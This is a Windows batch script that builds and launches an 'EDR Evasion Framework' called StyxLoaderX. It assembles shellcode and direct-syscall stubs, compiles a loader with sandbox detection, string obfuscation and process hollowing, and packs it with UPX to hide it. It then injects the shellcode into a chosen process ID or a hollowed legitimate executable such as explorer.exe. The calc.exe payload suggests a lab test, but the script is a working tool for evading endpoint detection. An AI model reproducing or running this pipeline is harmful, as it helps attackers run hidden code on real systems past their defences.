@echo off
REM Script to automate compilation and execution of the EDR Evasion Framework
REM Run as administrator in VM with Windows 11, Visual Studio, and NASM installed

echo ========================================
echo EDR Evasion Framework - Automation
echo ========================================

REM Check if in correct folder
if not exist "shellcode\shellcode.asm" (
    echo Error: Run this script from the project root (e.g., C:\StyxLoaderX).
    pause
    exit /b 1
)

REM Download dependencies automatically if not present
echo Checking dependencies...
if not exist "C:\OpenSSL" (
    echo Downloading OpenSSL for AES...
    powershell -Command "Invoke-WebRequest -Uri 'https://slproweb.com/download/Win64OpenSSL-3_0_8.exe' -OutFile 'openssl_installer.exe'"
    echo Installing OpenSSL (choose to install in C:\OpenSSL)...
    start /wait openssl_installer.exe /silent /dir="C:\OpenSSL"
    del openssl_installer.exe
)
if not exist "upx.exe" (
    echo Downloading UPX for packer...
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/upx/upx/releases/download/v4.0.2/upx-4.0.2-win64.zip' -OutFile 'upx.zip'"
    powershell -Command "Expand-Archive -Path 'upx.zip' -DestinationPath '.'"
    move upx-4.0.2-win64\upx.exe .
    rmdir /s /q upx-4.0.2-win64
    del upx.zip
)
echo Dependencies ready.

echo Paso 1: Compilando shellcode...
cd shellcode
nasm -f bin shellcode.asm -o shellcode.bin
if %errorlevel% neq 0 (
    echo Error al compilar shellcode. Verifica NASM instalado.
    cd ..
    pause
    exit /b 1
)
echo Shellcode compilado: shellcode.bin
cd ..

echo.
echo Paso 1.5: Compilando MASM syscall stubs...
REM Assemble the direct-syscall MASM stubs (commit 3: replaces the broken
REM MSVC inline __asm blocks that did not compile on x64 and contained NOPs).
ml64.exe /nologo /c /Cp modules\asm\styx_syscalls.asm
if %errorlevel% neq 0 (
    echo Error assembling styx_syscalls.asm. Verifica Visual Studio Build Tools.
    pause
    exit /b 1
)
echo styx_syscalls.obj compilado.

echo.
echo Paso 2: Compilando loaders...
REM Compilar SimpleInjector (standalone tool)
REM New architecture: src/*.cpp is the library, tools/*.cpp is the exe,
REM include/styxloader/*.hpp are the public headers.
cl /EHsc /std:c++17 /Iinclude tools\simple_injector_tool.cpp src\shellcode.cpp src\simple_injector.cpp /Fe:SimpleInjector.exe
if %errorlevel% neq 0 (
    echo Error al compilar SimpleInjector. Verifica Visual Studio.
    pause
    exit /b 1
)
echo SimpleInjector.exe compilado.

REM Compile MainLoader (modular) with OpenSSL + MASM stubs
REM Links: tools/main_loader.cpp + src/*.cpp library + styx_syscalls.obj (MASM)
cl /EHsc /std:c++17 /Iinclude /I C:\OpenSSL\include tools\main_loader.cpp src\shellcode.cpp src\sandbox_check.cpp src\string_obfuscator.cpp src\simple_injector.cpp src\hollow_injector.cpp src\direct_syscall.cpp modules\asm\styx_syscalls.obj /LIBPATH C:\OpenSSL\lib /Fe:MainLoader.exe libcrypto.lib libssl.lib
if %errorlevel% neq 0 (
    echo Error compiling MainLoader. Check OpenSSL installation.
    pause
    exit /b 1
)
echo MainLoader.exe compiled.

REM Apply UPX packer for obfuscation
echo Applying UPX packer...
upx -9 MainLoader.exe
if %errorlevel% neq 0 (
    echo Error with UPX. Check download.
    pause
    exit /b 1
)
echo MainLoader.exe packed with UPX.

echo.
echo Compilación completada. Ejecutables listos.
echo.

REM Execution menu
:menu
echo Select execution mode:
echo 1. Run SimpleInjector (basic - requires PID)
echo 2. Run MainLoader simple (requires PID)
echo 3. Run MainLoader direct (syscalls - requires PID)
echo 4. Run MainLoader hollow (process hollowing - requires legitimate EXE)
echo 5. Exit
set /p choice="Option: "

if "%choice%"=="1" goto simple_injector
if "%choice%"=="2" goto main_simple
if "%choice%"=="3" goto main_direct
if "%choice%"=="4" goto main_hollow
if "%choice%"=="5" goto end
echo Invalid option.
goto menu

:simple_injector
set /p pid="Enter target process PID (e.g., 1234): "
echo Running SimpleInjector on PID %pid%...
SimpleInjector.exe %pid% shellcode\shellcode.bin
goto end

:main_simple
set /p pid="Enter target process PID (e.g., 1234): "
echo Running MainLoader in simple mode on PID %pid%...
MainLoader.exe simple %pid% shellcode\shellcode.bin
goto end

:main_direct
set /p pid="Enter target process PID (e.g., 1234): "
echo Running MainLoader in direct mode on PID %pid%...
MainLoader.exe direct %pid% shellcode\shellcode.bin
goto end

:main_hollow
set /p exe="Enter legitimate EXE (e.g., explorer.exe): "
echo Running MainLoader in hollow mode on %exe%...
MainLoader.exe hollow %exe% shellcode\shellcode.bin
goto end

:end
echo.
echo Execution completed. Check for opened calc.exe and Sysmon logs.
pause